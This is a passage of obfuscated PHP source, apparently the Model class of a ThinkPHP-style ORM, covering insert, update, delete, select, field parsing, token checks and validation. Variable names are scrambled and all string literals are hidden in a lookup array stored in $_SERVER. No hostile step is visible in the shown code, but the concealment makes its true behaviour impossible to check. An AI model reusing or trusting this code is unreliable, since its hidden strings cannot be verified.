} } } $this->flush(); } } public function flush() { $êİÓá =& $_SERVER[ÕŸ²ó÷å]; $this->db->setModel($this->name); $´á¸‡ã = $this->db->getFields($this->getTableName()); if (!$´á¸‡ã) { return !1; } $this->fields = array_keys($´á¸‡ã); $this->fields[$êİÓá[336]] = !1; foreach ($´á¸‡ã as $š‰ğ×¯ => $â—µî™Í) { $¸‹€„ë‹[$š‰ğ×¯] = $â—µî™Í[$êİÓá[33]]; if ($â—µî™Í[$êİÓá[39]]) { $this->fields[$êİÓá[337]] = $š‰ğ×¯; if ($â—µî™Í[$êİÓá[42]]) { $this->fields[$êİÓá[336]] = !0; } } } $this->fields[$êİÓá[338]] = $¸‹€„ë‹; if (think_config($êİÓá[334])) { $this->fields[$êİÓá[335]] = think_config($êİÓá[334]); } if (think_config($êİÓá[331])) { $ãÄœÍú = $this->dbName ? $this->dbName : think_config($êİÓá[332]); think_var_cache($êİÓá[333] . strtolower(get_path_this($ãÄœÍú) . $êİÓá[10] . $this->name), $this->fields); } } public function switchModel($´¹™°, $¹¯˜…’Ì = array()) { $Ë›Âˆ¢ğ =& $_SERVER[ÕŸ²ó÷å]; $«àÀÅ× = ucwords(strtolower($´¹™°)) . $Ë›Âˆ¢ğ[339]; if (!class_exists($«àÀÅ×)) { think_exception($«àÀÅ× . think_lang($Ë›Âˆ¢ğ[340])); } $this->_extModel = new $«àÀÅ×($this->name); if (!empty($¹¯˜…’Ì)) { foreach ($¹¯˜…’Ì as $£”×û¢˜) { $this->_extModel->setProperty($£”×û¢˜, $this->{$£”×û¢˜}); } } return $this->_extModel; } public function __set($°Ï°¨šø, $í…‹†š¤) { $this->data[$°Ï°¨šø] = $í…‹†š¤; } public function __get($ÖÏÈ½) { return isset($this->data[$ÖÏÈ½]) ? $this->data[$ÖÏÈ½] : null; } public function __isset($ŒåÖÄèù) { return isset($this->data[$ŒåÖÄèù]); } public function __unset($¬Ö¤·Œ») { unset($this->data[$¬Ö¤·Œ»]); } public function __call($•Üõğë, $ç¹İĞ‚«) { $Œ¢Ÿ¡’± =& $_SERVER[ÕŸ²ó÷å]; if (in_array(strtolower($•Üõğë), $this->methods, !0)) { $this->options[strtolower($•Üõğë)] = $ç¹İĞ‚«[0]; return $this; } elseif (in_array(strtolower($•Üõğë), array($Œ¢Ÿ¡’±[341], $Œ¢Ÿ¡’±[342], $Œ¢Ÿ¡’±[343], $Œ¢Ÿ¡’±[344], $Œ¢Ÿ¡’±[345]), !0)) { $“ù‹œüœ = isset($ç¹İĞ‚«[0]) ? $ç¹İĞ‚«[0] : $Œ¢Ÿ¡’±[230]; $“ù‹œüœ = $this->db->parseKey($“ù‹œüœ); return $this->getField(strtoupper($•Üõğë) . $Œ¢Ÿ¡’±[346] . $“ù‹œüœ . $Œ¢Ÿ¡’±[347] . $•Üõğë, $Œ¢Ÿ¡’±[341]); } elseif (strtolower(substr($•Üõğë, 0, 5)) == $Œ¢Ÿ¡’±[348]) { $“ù‹œüœ = think_parse_name(substr($•Üõğë, 5)); $©çá½‹§[$“ù‹œüœ] = $ç¹İĞ‚«[0]; return $this->where($©çá½‹§)->find(); } elseif (strtolower(substr($•Üõğë, 0, 10)) == $Œ¢Ÿ¡’±[349]) { $àÕéó¤– = think_parse_name(substr($•Üõğë, 10)); $©çá½‹§[$àÕéó¤–] = $ç¹İĞ‚«[0]; return $this->where($©çá½‹§)->getField($ç¹İĞ‚«[1]); } elseif (isset($this->_scope[$•Üõğë])) { return $this->scope($•Üõğë, $ç¹İĞ‚«[0]); } elseif (method_exists($this, $•Üõğë)) { array_unshift($ç¹İĞ‚«, $•Üõğë); return call_user_func_array(array($this, $Œ¢Ÿ¡’±[350]), $ç¹İĞ‚«); } else { return call_user_func_array(array(parent, $•Üõğë), $ç¹İĞ‚«); } } protected function call() { $¹•½Îúì =& $_SERVER[ÕŸ²ó÷å]; $Áå”Ç‰ä = func_get_args(); $Ê²¹°ĞÖ = array_shift($Áå”Ç‰ä); $”ò¯œ–³ = $Ê²¹°ĞÖ; if (is_array($Ê²¹°ĞÖ)) { $”ò¯œ–³ = $Ê²¹°ĞÖ[1]; $Ê²¹°ĞÖ = $Ê²¹°ĞÖ[0]; } $ÜÌšı‘ = count($Áå”Ç‰ä) - 1; if (isset($Áå”Ç‰ä[$ÜÌšı‘]) && $Áå”Ç‰ä[$ÜÌšı‘] === $Ê²¹°ĞÖ) { think_exception(__CLASS__ . $¹•½Îúì[4] . $Ê²¹°ĞÖ . think_lang($¹•½Îúì[351])); return; } $Áå”Ç‰ä[] = $Ê²¹°ĞÖ; if (method_exists($this, $¹•½Îúì[352])) { $æØºíÂ× = call_user_func_array(array($this, $¹•½Îúì[353]), array($”ò¯œ–³, $Áå”Ç‰ä)); if (!is_null($æØºíÂ×) && $æØºíÂ× !== !1) { return $æØºíÂ×; } } $î¯ØÃŠ­ = call_user_func_array(array($this, $Ê²¹°ĞÖ), $Áå”Ç‰ä); if (method_exists($this, $¹•½Îúì[354])) { $æØºíÂ× = call_user_func_array(array($this, $¹•½Îúì[355]), array($”ò¯œ–³, $Áå”Ç‰ä, $î¯ØÃŠ­)); if ($æØºíÂ×) { return $æØºíÂ×; } } return $î¯ØÃŠ­; } protected function _initialize() { } protected function _facade($î¹á¼Œß) { $…ƒÉšÓ =& $_SERVER[ÕŸ²ó÷å]; if (!empty($this->fields)) { foreach ($î¹á¼Œß as $ÙÃŞŞ× => $Áï‘£Á…) { if (is_array($this->fields) && !in_array($ÙÃŞŞ×, $this->fields, !0)) { unset($î¹á¼Œß[$ÙÃŞŞ×]); } elseif (is_scalar($Áï‘£Á…)) { $this->_parseType($î¹á¼Œß, $ÙÃŞŞ×); } } } if (!empty($this->options[$…ƒÉšÓ[356]])) { $î¹á¼Œß = array_map($this->options[$…ƒÉšÓ[356]], $î¹á¼Œß); unset($this->options[$…ƒÉšÓ[356]]); } $this->_beforeWrite($î¹á¼Œß); return $î¹á¼Œß; } protected function _beforeWrite(&$ÙÍááï•) { } public function add($ú¤¹½‡Á = '', $ŸôâóÖ = array(), $šÓ…ğÜ = false) { if (empty($ú¤¹½‡Á)) { if (!empty($this->data)) { $ú¤¹½‡Á = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ÕŸ²ó÷å][357]); return !1; } } $ŸôâóÖ = $this->_parseOptions($ŸôâóÖ); $ú¤¹½‡Á = $this->_facade($ú¤¹½‡Á); if (!1 === $this->_beforeInsert($ú¤¹½‡Á, $ŸôâóÖ)) { return !1; } $–ÀÕ…Ñœ = $this->db->insert($ú¤¹½‡Á, $ŸôâóÖ, $šÓ…ğÜ); if (!1 !== $–ÀÕ…Ñœ) { $ø²ñ’•œ = $this->getLastInsID(); if ($ø²ñ’•œ) { $ú¤¹½‡Á[$this->getPk()] = $ø²ñ’•œ; $this->_after_insert($ú¤¹½‡Á, $ŸôâóÖ); return $ø²ñ’•œ; } $this->_after_insert($ú¤¹½‡Á, $ŸôâóÖ); } return $–ÀÕ…Ñœ; } protected function _beforeInsert(&$·Ö­ÛÏ, $«ú÷¸—¾) { } protected function _after_insert($íµœ¶¬¹, $éé¬Í’) { } public function addAll($°ÉÑñ®Ò, $Šàší¯ = array(), $­Ú¡Ê¡æ = false) { $­ÚïÚ « =& $_SERVER[ÕŸ²ó÷å]; if (empty($°ÉÑñ®Ò)) { $this->error = think_lang($­ÚïÚ «[357]); return !1; } $Šàší¯ = $this->_parseOptions($Šàší¯); foreach ($°ÉÑñ®Ò as $ÚÎòÃªû => $¨°“×í¥) { $°ÉÑñ®Ò[$ÚÎòÃªû] = $this->_facade($¨°“×í¥); } if (method_exists($this->db, $­ÚïÚ «[358])) { $î„¤çİƒ = $this->db->insertAll($°ÉÑñ®Ò, $Šàší¯, $­Ú¡Ê¡æ); } else { $this->startTrans(); foreach ($°ÉÑñ®Ò as $ÚÎòÃªû => $¨°“×í¥) { $î„¤çİƒ = $this->db->insert($¨°“×í¥, $Šàší¯, $­Ú¡Ê¡æ); } $this->commit(); } if (!1 !== $î„¤çİƒ) { $×ÙÛã­Â = $this->getLastInsID(); if ($×ÙÛã­Â) { return $×ÙÛã­Â; } } return $î„¤çİƒ; } public function selectAdd($â‹âÚùÃ = '', $óÈæåĞ¯ = '', $ŠÃ“ÏØŠ = array()) { $ßÔ§ğ¯‚ =& $_SERVER[ÕŸ²ó÷å]; $ŠÃ“ÏØŠ = $this->_parseOptions($ŠÃ“ÏØŠ); if (!1 === ($ëÍê³³¯ = $this->db->selectInsert($â‹âÚùÃ ? $â‹âÚùÃ : $ŠÃ“ÏØŠ[$ßÔ§ğ¯‚[359]], $óÈæåĞ¯ ? $óÈæåĞ¯ : $this->getTableName(), $ŠÃ“ÏØŠ))) { $this->error = think_lang($ßÔ§ğ¯‚[360]); return !1; } else { return $ëÍê³³¯; } } public function save($„¤÷ôßØ = '', $Šó”• = array()) { $ºÁ‰»Æ =& $_SERVER[ÕŸ²ó÷å]; if (empty($„¤÷ôßØ)) { if (!empty($this->data)) { $„¤÷ôßØ = $this->data; $this->data = array(); } else { $this->error = think_lang($ºÁ‰»Æ[357]); return !1; } } $„¤÷ôßØ = $this->_facade($„¤÷ôßØ); $Šó”• = $this->_parseOptions($Šó”•); $›ı™²ÕÙ = $this->getPk(); if (!isset($Šó”•[$ºÁ‰»Æ[361]])) { if (isset($„¤÷ôßØ[$›ı™²ÕÙ])) { $À˜õù¡¼[$›ı™²ÕÙ] = $„¤÷ôßØ[$›ı™²ÕÙ]; $Šó”•[$ºÁ‰»Æ[361]] = $À˜õù¡¼; unset($„¤÷ôßØ[$›ı™²ÕÙ]); } else { $this->error = think_lang($ºÁ‰»Æ[360]); return !1; } } if (is_array($Šó”•[$ºÁ‰»Æ[361]]) && isset($Šó”•[$ºÁ‰»Æ[361]][$›ı™²ÕÙ])) { $›ğšœå = $Šó”•[$ºÁ‰»Æ[361]][$›ı™²ÕÙ]; } if (!1 === $this->_beforeUpdate($„¤÷ôßØ, $Šó”•)) { return !1; } $åİÓÁú = $this->db->update($„¤÷ôßØ, $Šó”•); if (!1 !== $åİÓÁú) { if (isset($›ğšœå)) { $„¤÷ôßØ[$›ı™²ÕÙ] = $›ğšœå; } $this->_afterUpdate($„¤÷ôßØ, $Šó”•); } return $åİÓÁú; } protected function _beforeUpdate(&$÷û­ó´€, $ô•×İ½ô) { } protected function _afterUpdate($’û¢’Üø, $Íö¸½½) { } public function delete($Ï¢úåÁ¼ = array()) { $Ü™Û¯ˆÔ =& $_SERVER[ÕŸ²ó÷å]; if (empty($Ï¢úåÁ¼) && empty($this->options[$Ü™Û¯ˆÔ[361]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $‘¨í“¶º = $this->getPk(); if (is_numeric($Ï¢úåÁ¼) || is_string($Ï¢úåÁ¼)) { if (strpos($Ï¢úåÁ¼, $Ü™Û¯ˆÔ[50])) { $·‡óüŒ³[$‘¨í“¶º] = array($Ü™Û¯ˆÔ[362], $Ï¢úåÁ¼); } else { $·‡óüŒ³[$‘¨í“¶º] = $Ï¢úåÁ¼; } $this->options[$Ü™Û¯ˆÔ[361]] = $·‡óüŒ³; } $Ï¢úåÁ¼ = $this->_parseOptions(); if (is_array($Ï¢úåÁ¼[$Ü™Û¯ˆÔ[361]]) && isset($Ï¢úåÁ¼[$Ü™Û¯ˆÔ[361]][$‘¨í“¶º])) { $ë‘úìõÕ = $Ï¢úåÁ¼[$Ü™Û¯ˆÔ[361]][$‘¨í“¶º]; } $˜Åàú€İ = $this->db->delete($Ï¢úåÁ¼); if (!1 !== $˜Åàú€İ) { $å×òŒˆ§ = array(); if (isset($ë‘úìõÕ)) { $å×òŒˆ§[$‘¨í“¶º] = $ë‘úìõÕ; } $this->_after_delete($å×òŒˆ§, $Ï¢úåÁ¼); } return $˜Åàú€İ; } protected function _after_delete($‹‰Àïä¬, $‘ÔØÚÚ) { } public function select($èÒ”Á¿á = array()) { $óÚ¬ÃØ =& $_SERVER[ÕŸ²ó÷å]; if (is_string($èÒ”Á¿á) || is_numeric($èÒ”Á¿á)) { $ÄÍˆÉ  = $this->getPk(); if (strpos($èÒ”Á¿á, $óÚ¬ÃØ[50])) { $ ÑªÌš€[$ÄÍˆÉ ] = array($óÚ¬ÃØ[362], $èÒ”Á¿á); } else { $ ÑªÌš€[$ÄÍˆÉ ] = $èÒ”Á¿á; } $this->options[$óÚ¬ÃØ[361]] = $ ÑªÌš€; } elseif (!1 === $èÒ”Á¿á) { $èÒ”Á¿á = $this->_parseOptions(); return $óÚ¬ÃØ[363] . $this->db->buildSelectSql($èÒ”Á¿á) . $óÚ¬ÃØ[364]; } $èÒ”Á¿á = $this->_parseOptions(); $ûş£êÙÊ = $this->db->select($èÒ”Á¿á); if (!1 === $ûş£êÙÊ) { return !1; } if (empty($ûş£êÙÊ)) { return null; } $this->_afterSelect($ûş£êÙÊ, $èÒ”Á¿á); return $ûş£êÙÊ; } protected function _afterSelect(&$Çš¿úÄæ, $¬ÔÌú²·) { } public function buildSql($‚£âëº„ = array()) { $Œ÷Ş»èØ =& $_SERVER[ÕŸ²ó÷å]; $‚£âëº„ = $this->_parseOptions($‚£âëº„); return $Œ÷Ş»èØ[363] . $this->db->buildSelectSql($‚£âëº„) . $Œ÷Ş»èØ[364]; } public function optionsValue($ªÙœ‰¨‰ = null) { if (is_null($ªÙœ‰¨‰)) { return $this->options; } elseif (is_array($ªÙœ‰¨‰)) { $this->options = array_merge($this->options, $ªÙœ‰¨‰); } } protected function _parseOptions($´Ô² ­  = array()) { $ûóœ»è² =& $_SERVER[ÕŸ²ó÷å]; if (is_array($´Ô² ­ )) { $´Ô² ­  = array_merge($this->options, $´Ô² ­ ); } $this->options = array(); if (!isset($´Ô² ­ [$ûóœ»è²[365]])) { $´Ô² ­ [$ûóœ»è²[365]] = $this->getTableName(); $§ó–â¬ = $this->fields; } else { $§ó–â¬ = $this->getDbFields(); } if (!empty($´Ô² ­ [$ûóœ»è²[366]])) { $´Ô² ­ [$ûóœ»è²[365]] .= $ûóœ»è²[53] . $´Ô² ­ [$ûóœ»è²[366]]; } $´Ô² ­ [$ûóœ»è²[367]] = $this->name; if (isset($´Ô² ­ [$ûóœ»è²[361]]) && is_array($´Ô² ­ [$ûóœ»è²[361]]) && !empty($§ó–â¬) && !isset($´Ô² ­ [$ûóœ»è²[368]]) && !isset($´Ô² ­ [$ûóœ»è²[365]])) { foreach ($´Ô² ­ [$ûóœ»è²[361]] as $¬ñ°ı¥¦ => $îÒÈˆç‚) { $¬ñ°ı¥¦ = trim($¬ñ°ı¥¦); if (in_array($¬ñ°ı¥¦, $§ó–â¬, !0)) { if (is_scalar($îÒÈˆç‚)) { $this->_parseType($´Ô² ­ [$ûóœ»è²[361]], $¬ñ°ı¥¦); } } elseif (!is_numeric($¬ñ°ı¥¦) && $ûóœ»è²[11] != substr($¬ñ°ı¥¦, 0, 1) && !1 === strpos($¬ñ°ı¥¦, $ûóœ»è²[10]) && !1 === strpos($¬ñ°ı¥¦, $ûóœ»è²[346]) && !1 === strpos($¬ñ°ı¥¦, $ûóœ»è²[224]) && !1 === strpos($¬ñ°ı¥¦, $ûóœ»è²[369])) { unset($´Ô² ­ [$ûóœ»è²[361]][$¬ñ°ı¥¦]); } } } $this->_options_filter($´Ô² ­ ); return $´Ô² ­ ; } protected function _options_filter(&$ùõ€ÀÄŞ) { } protected function _parseType(&$×Ì„ğëÖ, $¿Š¶Ã°) { $€êü =& $_SERVER[ÕŸ²ó÷å]; if (empty($this->options[$€êü[370]][$€êü[4] . $¿Š¶Ã°])) { $¨ı¶Ã ƒ = strtolower($this->fields[$€êü[338]][$¿Š¶Ã°]); if (!1 !== strpos($¨ı¶Ã ƒ, $€êü[371])) { } elseif (!1 === strpos($¨ı¶Ã ƒ, $€êü[372]) && !1 !== strpos($¨ı¶Ã ƒ, $€êü[373])) { $×Ì„ğëÖ[$¿Š¶Ã°] = intval($×Ì„ğëÖ[$¿Š¶Ã°]); } elseif (!1 !== strpos($¨ı¶Ã ƒ, $€êü[374]) || !1 !== strpos($¨ı¶Ã ƒ, $€êü[375])) { $×Ì„ğëÖ[$¿Š¶Ã°] = floatval($×Ì„ğëÖ[$¿Š¶Ã°]); } elseif (!1 !== strpos($¨ı¶Ã ƒ, $€êü[376])) { $×Ì„ğëÖ[$¿Š¶Ã°] = (bool) $×Ì„ğëÖ[$¿Š¶Ã°]; } } } public function find($Ø«¦ñûÁ = array()) { $ÇÌãÍè =& $_SERVER[ÕŸ²ó÷å]; if (is_numeric($Ø«¦ñûÁ) || is_string($Ø«¦ñûÁ)) { $ç²óÊ[$this->getPk()] = intval($Ø«¦ñûÁ); $this->options[$ÇÌãÍè[361]] = $ç²óÊ; } $this->options[$ÇÌãÍè[377]] = 1; $Ø«¦ñûÁ = $this->_parseOptions(); $…ˆ²¤ = $this->db->select($Ø«¦ñûÁ); if (!1 === $…ˆ²¤) { return !1; } if (empty($…ˆ²¤)) { return null; } $this->data = $…ˆ²¤[0]; $this->_afterFind($this->data, $Ø«¦ñûÁ); if (!empty($this->options[$ÇÌãÍè[378]])) { return $this->returnResult($this->data, $this->options[$ÇÌãÍè[378]]); } return $this->data; } protected function _afterFind(&$¼±óâßÈ, $ù ¶ªœò) { } protected function returnResult($²àÒî›ü, $´øï± = '') { $ÎÃã°éõ =& $_SERVER[ÕŸ²ó÷å]; if ($´øï±) { if (is_callable($´øï±)) { return call_user_func($´øï±, $²àÒî›ü); } switch (strtolower($´øï±)) { case $ÎÃã°éõ[379]: return json_encode($²àÒî›ü); case $ÎÃã°éõ[380]: return xml_encode($²àÒî›ü); } } return $²àÒî›ü; } public function parseFieldsMap($¢âÂ¨´õ, $·Ô¸Çê = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ŞÇÀÃ©„ => $åÎá¿°…) { if ($·Ô¸Çê == 1) { if (isset($¢âÂ¨´õ[$åÎá¿°…])) { $¢âÂ¨´õ[$ŞÇÀÃ©„] = $¢âÂ¨´õ[$åÎá¿°…]; unset($¢âÂ¨´õ[$åÎá¿°…]); } } else { if (isset($¢âÂ¨´õ[$ŞÇÀÃ©„])) { $¢âÂ¨´õ[$åÎá¿°…] = $¢âÂ¨´õ[$ŞÇÀÃ©„]; unset($¢âÂ¨´õ[$ŞÇÀÃ©„]); } } } } return $¢âÂ¨´õ; } public function setField($­ ¼»Ê¸, $Çï¿ªœè = '') { if (is_array($­ ¼»Ê¸)) { $²ü“£ª› = $­ ¼»Ê¸; } else { $²ü“£ª›[$­ ¼»Ê¸] = $Çï¿ªœè; } return $this->save($²ü“£ª›); } public function setAdd($ëµ¥Ğ·â, $ñîÔĞè¦ = 1) { $ş£µßï =& $_SERVER[ÕŸ²ó÷å]; $‘şõ™ïı = $ëµ¥Ğ·â . $ş£µßï[381] . $ñîÔĞè¦; if ($ñîÔĞè¦ < 0) { $‘şõ™ïı = $ëµ¥Ğ·â . $ñîÔĞè¦; } return $this->setField($ëµ¥Ğ·â, array($ş£µßï[382], $‘şõ™ïı)); } public function getField($ˆÁ‘´Éë, $Ôã¸ş–ƒ = null) { $¶Õ¤ëÊ =& $_SERVER[ÕŸ²ó÷å]; $ÊĞòÄÜÓ[$¶Õ¤ëÊ[359]] = $ˆÁ‘´Éë; $ÊĞòÄÜÓ = $this->_parseOptions($ÊĞòÄÜÓ); $ˆÁ‘´Éë = trim($ˆÁ‘´Éë); if (strpos($ˆÁ‘´Éë, $¶Õ¤ëÊ[50])) { if (!isset($ÊĞòÄÜÓ[$¶Õ¤ëÊ[377]])) { $ÊĞòÄÜÓ[$¶Õ¤ëÊ[377]] = is_numeric($Ôã¸ş–ƒ) ? $Ôã¸ş–ƒ : $¶Õ¤ëÊ[12]; } $×Œ¾‡­ = $this->db->select($ÊĞòÄÜÓ); if (!empty($×Œ¾‡­)) { $îÄ¨‰ë¸ = explode($¶Õ¤ëÊ[50], $ˆÁ‘´Éë); $ˆÁ‘´Éë = array_keys($×Œ¾‡­[0]); $»ª¢£‡… = array_shift($ˆÁ‘´Éë); $÷šµá = array_shift($ˆÁ‘´Éë); $É«Ïëñò = array(); $ÄËŠ¡Ğ½ = count($îÄ¨‰ë¸); foreach ($×Œ¾‡­ as $šøçØª) { $Ğ°¿õ®ì = $šøçØª[$»ª¢£‡…]; if (2 == $ÄËŠ¡Ğ½) { $É«Ïëñò[$Ğ°¿õ®ì] = $šøçØª[$÷šµá]; } else { $É«Ïëñò[$Ğ°¿õ®ì] = is_string($Ôã¸ş–ƒ) ? implode($Ôã¸ş–ƒ, $šøçØª) : $šøçØª; } } return $É«Ïëñò; } } else { if (!0 !== $Ôã¸ş–ƒ) { $ÊĞòÄÜÓ[$¶Õ¤ëÊ[377]] = is_numeric($Ôã¸ş–ƒ) ? $Ôã¸ş–ƒ : 1; } if ($Ôã¸ş–ƒ === $¶Õ¤ëÊ[341]) { unset($ÊĞòÄÜÓ[$¶Õ¤ëÊ[377]]); } $šøçØª = $this->db->select($ÊĞòÄÜÓ); if (!empty($šøçØª)) { if ($Ôã¸ş–ƒ === $¶Õ¤ëÊ[341]) { return reset($šøçØª[0]); } if (!0 !== $Ôã¸ş–ƒ && 1 == $ÊĞòÄÜÓ[$¶Õ¤ëÊ[377]]) { return reset($šøçØª[0]); } foreach ($šøçØª as $•ÆÙÃ) { $ê§îüïÊ[] = $•ÆÙÃ[$ˆÁ‘´Éë]; } return $ê§îüïÊ; } } return null; } public function create($´Âèï« = '', $¸˜ûÉøû = '') { $æ º¿ÓÑ =& $_SERVER[ÕŸ²ó÷å]; if (empty($´Âèï«)) { $´Âèï« = $_POST; } elseif (is_object($´Âèï«)) { $´Âèï« = get_object_vars($´Âèï«); } if (empty($´Âèï«) || !is_array($´Âèï«)) { $this->error = think_lang($æ º¿ÓÑ[357]); return !1; } $´Âèï« = $this->parseFieldsMap($´Âèï«, 0); $¸˜ûÉøû = $¸˜ûÉøû ? $¸˜ûÉøû : (!empty($´Âèï«[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$æ º¿ÓÑ[359]])) { $•ÀŸå÷Î = $this->options[$æ º¿ÓÑ[359]]; unset($this->options[$æ º¿ÓÑ[359]]); } elseif ($¸˜ûÉøû == THINK_MODEL_INSERT && isset($this->insertFields)) { $•ÀŸå÷Î = $this->insertFields; } elseif ($¸˜ûÉøû == THINK_MODEL_UPDATE && isset($this->updateFields)) { $•ÀŸå÷Î = $this->updateFields; } if (isset($•ÀŸå÷Î)) { if (is_string($•ÀŸå÷Î)) { $•ÀŸå÷Î = explode($æ º¿ÓÑ[50], $•ÀŸå÷Î); } if (think_config($æ º¿ÓÑ[383])) { $•ÀŸå÷Î[] = think_config($æ º¿ÓÑ[384]); } foreach ($´Âèï« as $ª¾¼õĞ— => $’³¨®úœ) { if (!in_array($ª¾¼õĞ—, $•ÀŸå÷Î)) { unset($´Âèï«[$ª¾¼õĞ—]); } } } if (!$this->autoValidation($´Âèï«, $¸˜ûÉøû)) { return !1; } if (!$this->autoCheckToken($´Âèï«)) { $this->error = think_lang($æ º¿ÓÑ[385]); return !1; } if ($this->autoCheckFields) { $•ÀŸå÷Î = $this->getDbFields(); foreach ($´Âèï« as $ª¾¼õĞ— => $’³¨®úœ) { if (!in_array($ª¾¼õĞ—, $•ÀŸå÷Î)) { unset($´Âèï«[$ª¾¼õĞ—]); } elseif (MAGIC_QUOTES_GPC && is_string($’³¨®úœ)) { $´Âèï«[$ª¾¼õĞ—] = stripslashes($’³¨®úœ); } } } $this->autoOperation($´Âèï«, $¸˜ûÉøû); $this->data = $´Âèï«; return $´Âèï«; } public function autoCheckToken($âÀËèıá) { $†£Ü±†õ =& $_SERVER[ÕŸ²ó÷å]; if (isset($this->options[$†£Ü±†õ[386]]) && !$this->options[$†£Ü±†õ[386]]) { return !0; } if (think_config($†£Ü±†õ[383])) { $¼ğ¤Ö“” = think_config($†£Ü±†õ[384]); if (!isset($âÀËèıá[$¼ğ¤Ö“”]) || Session::get($¼ğ¤Ö“”)) { return !1; } list($şÌÃ¿©¹, $Ù¿ÂËÀ£) = explode($†£Ü±†õ[11], $âÀËèıá[$¼ğ¤Ö“”]); if ($Ù¿ÂËÀ£ && Session::get($¼ğ¤Ö“” . $†£Ü±†õ[10] . $şÌÃ¿©¹) === $Ù¿ÂËÀ£) { Session::remove($¼ğ¤Ö“” . $†£Ü±†õ[10] . $şÌÃ¿©¹); return !0; } if (think_config($†£Ü±†õ[387])) { Session::remove($¼ğ¤Ö“” . $†£Ü±†õ[10] . $şÌÃ¿©¹); } return !1; } return !0; } public function regex($¤úÚö¶õ, $»Ïª‰êí) { $šÏÁ‚âå =& $_SERVER[ÕŸ²ó÷å]; $†»•ë¬ = array($šÏÁ‚âå[388] => $šÏÁ‚âå[389], $šÏÁ‚âå[390] => $šÏÁ‚âå[391], $šÏÁ‚âå[392] => $šÏÁ‚âå[393], $šÏÁ‚âå[394] => $šÏÁ‚âå[395], $šÏÁ‚âå[396] => $šÏÁ‚âå[397], $šÏÁ‚âå[398] => $šÏÁ‚âå[399], $šÏÁ‚âå[400] => $šÏÁ‚âå[401], $šÏÁ‚âå[375] => $šÏÁ‚âå[402], $šÏÁ‚âå[403] => $šÏÁ‚âå[404]); if (isset($†»•ë¬[strtolower($»Ïª‰êí)])) { $»Ïª‰êí = $†»•ë¬[strtolower($»Ïª‰êí)]; } return preg_match($»Ïª‰êí, $¤úÚö¶õ) === 1; } private function autoOperation(&$²€àôÇö, $×ñ•¯Üê) { $£·Ô¨çó =& $_SERVER[ÕŸ²ó÷å]; if (!empty($this->options[$£·Ô¨çó[405]])) { $õªê€İû = $this->options[$£·Ô¨çó[405]]; unset($this->options[$£·Ô¨çó[405]]); } elseif (!empty($this->_auto)) { $õªê€İû = $this->_auto; } if (isset($õªê€İû)) { foreach ($õªê€İû as $¤£€úìÒ) { if (empty($¤£€úìÒ[2])) { $¤£€úìÒ[2] = THINK_MODEL_INSERT; } if ($×ñ•¯Üê == $¤£€úìÒ[2] || $¤£€úìÒ[2] == THINK_MODEL_BOTH) { switch (trim($¤£€úìÒ[3])) { case $£·Ô¨çó[406]: case $£·Ô¨çó[407]: $ÈÒêÓü† = isset($¤£€úìÒ[4]) ? (array) $¤£€úìÒ[4] : array(); if (isset($²€àôÇö[$¤£€úìÒ[0]])) { array_unshift($ÈÒêÓü†, $²€àôÇö[$¤£€úìÒ[0]]); } if ($£·Ô¨çó[406] == $¤£€úìÒ[3]) { $²€àôÇö[$¤£€úìÒ[0]] = call_user_func_array($¤£€úìÒ[1], $ÈÒêÓü†); } else { $²€àôÇö[$¤£€úìÒ[0]] = call_user_func_array(array(&$this, $¤£€úìÒ[1]), $ÈÒêÓü†); } break; case $£·Ô¨çó[359]: $²€àôÇö[$¤£€úìÒ[0]] = $²€àôÇö[$¤£€úìÒ[1]]; break; case $£·Ô¨çó[408]: if ($£·Ô¨çó[12] === $²€àôÇö[$¤£€úìÒ[0]]) { unset($²€àôÇö[$¤£€úìÒ[0]]); } break; case $£·Ô¨çó[409]: default: $²€àôÇö[$¤£€úìÒ[0]] = $¤£€úìÒ[1]; } if (!1 === $²€àôÇö[$¤£€úìÒ[0]]) { unset($²€àôÇö[$¤£€úìÒ[0]]); } } } } return $²€àôÇö; } protected function autoValidation($Ş·¸È, $£˜ÈÔÜÓ) { $«ËÆÂì =& $_SERVER[ÕŸ²ó÷å]; if (!empty($this->options[$«ËÆÂì[410]])) { $ê·—ßÇº = $this->options[$«ËÆÂì[410]]; unset($this->options[$«ËÆÂì[410]]); } elseif (!empty($this->_validate)) { $ê·—ßÇº = $this->_validate; } if (isset($ê·—ßÇº)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ê·—ßÇº as $¬‘ô£°ñ => $ŒÔ¶Øâî) { if (empty($ŒÔ¶Øâî[5]) || $ŒÔ¶Øâî[5] == THINK_MODEL_BOTH || $ŒÔ¶Øâî[5] == $£˜ÈÔÜÓ) { if (0 == strpos($ŒÔ¶Øâî[2], $«ËÆÂì[411]) && strpos($ŒÔ¶Øâî[2], $«ËÆÂì[412])) { $ŒÔ¶Øâî[2] = think_lang(substr($ŒÔ¶Øâî[2], 2, -1)); } $ŒÔ¶Øâî[3] = isset($ŒÔ¶Øâî[3]) ? $ŒÔ¶Øâî[3] : THINK_EXISTS_VALIDATE; $ŒÔ¶Øâî[4] = isset($ŒÔ¶Øâî[4]) ? $ŒÔ¶Øâî[4] : $«ËÆÂì[413]; switch ($ŒÔ¶Øâî[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Ş·¸È, $ŒÔ¶Øâî)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($«ËÆÂì[12] != trim($Ş·¸È[$ŒÔ¶Øâî[0]])) { if (!1 === $this->_validationField($Ş·¸È, $ŒÔ¶Øâî)) { return !1; } } break; default: if (isset($Ş·¸È[$ŒÔ¶Øâî[0]])) { if (!1 === $this->_validationField($Ş·¸È, $ŒÔ¶Øâî)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($íÄ‚™Ÿ, $á¥Ñç—À) { if (!1 === $this->_validationFieldItem($íÄ‚™Ÿ, $á¥Ñç—À)) { if ($this->patchValidate) { $this->error[$á¥Ñç—À[0]] = $á¥Ñç—À[2]; } else { $this->error = $á¥Ñç—À[2]; return !1; } } return; } protected function _validationFieldItem($ƒô×¼Ùñ, $–¼‚‡á) { $²¿ŞÄ­ì =& $_SERVER[ÕŸ²ó÷å]; switch (strtolower(trim($–¼‚‡á[4]))) { case $²¿ŞÄ­ì[406]: case $²¿ŞÄ­ì[407]: $éÙûà”ç = isset($–¼‚‡á[6]) ? (array) 